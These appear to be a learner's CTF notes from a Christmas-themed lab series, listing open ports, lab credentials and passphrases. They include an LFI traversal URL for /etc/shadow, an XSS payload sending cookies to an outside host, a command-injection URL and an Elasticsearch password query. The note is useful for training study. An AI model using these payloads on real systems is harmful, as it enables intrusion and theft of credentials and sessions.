# Metasploit task

SSH Credentials:
santa:rudolphrednosedreindeer

# Day 11
Open ports:
21 - FTP
22 - SSH
111- rpcbind
2049 - NFS
3306 - MySQL

- Creds.txt - "the password is securepassword123"
-  MySQL creds - "root, ff912ABD*"*
NB: The "\*" appended to the line above is to escape that in the password

Database creds:
+-------+--------------+
| name  | password     |
+-------+--------------+
| admin | bestpassword |
+-------+--------------+
1 row in set (0.720 sec)

# Elfcryption
Pretty good privacy encryption key: "25daysofchristmas"
Decrypted text: "I will meet you outside Santa's Grotto at 5pm!"
Decrypting the encrypted text with RSA private key: "openssl rsautl -decrypt -inkey private.key -in note2_encrypted.txt -out plaintext.txt"; Passphrase is "hello"

# Accumulate (Day 13)
Interesting directory: /retro

# Day 14
- https://advent-bucket-one.s3.amazonaws.com
- https://advent-bucket-one.s3.amazonaws.com/employee_names.txt

# Local File Inclusion
Payload for /etc/shadow: http://10.10.27.101/get-file/..%2F..%2F..%2Fetc%2Fshadow
Payload for flag: http://10.10.27.101/get-file/..%2F..%2F..%2Fhome%2Fcharlie%2Fflag1.txt

# Elf JS
- Payload:
<code>
	<script>
		window.location("http://<local_IP>/?cookie="+document.cookie)
	</script>
</code>

# Command Injection
- Payload: http://10.10.96.173:3000/api/cmd/cat%20%2Fhome%2Fbestadmin%2Fuser.txt

# Day 23 - SQL Injection

<code>
<?php
ob_start(); //Turns on output buffering 
session_start();

$timezone = date_default_timezone_set("Europe/London");

$con = mysqli_connect("localhost", "santa", "PizzaParty123", "social"); //Connection variable

if(mysqli_connect_errno()) 
{
	echo "Failed to connect: " . mysqli_connect_errno();
}

?>
</code>

Current database: social
Table of interest: users
Column of interest: %santa%
Santa's email: bigman@shefesh.com
Santa's password: saltnpepper

# ELK Stack
Open ports:
"""
22 - ssh
111 - rpcbind
5601 - kibana
8000 - http server
9200 - Elastic search API
"""
- Payload: http://<MACHINE_IP>:9200/_search?q=password